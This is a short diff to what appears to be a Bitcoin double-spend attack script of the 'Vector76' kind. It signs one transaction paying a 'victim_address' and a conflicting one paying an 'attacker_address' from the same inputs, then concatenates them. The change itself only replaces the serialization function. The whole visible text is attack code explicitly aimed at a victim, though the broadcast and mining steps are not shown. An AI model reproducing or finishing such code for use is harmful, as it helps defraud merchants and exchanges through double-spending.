@@ -88,11 +88,11 @@ tx_victim = [{"address": victim_address, "value": send_amount}]
 tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
 print(tx_victim)
-tx_victim = bitcoin.core.serialize(transaction_util.signall(tx_victim, key))
+tx_victim = transaction_util.serialize(transaction_util.signall(tx_victim, key))
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
-tx_attacker = bitcoin.core.serialize(transaction_util.signall(tx_attacker, key))
+tx_attacker = transaction_util.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
 tx_vector76 = f"{tx_attacker}{tx_victim}"
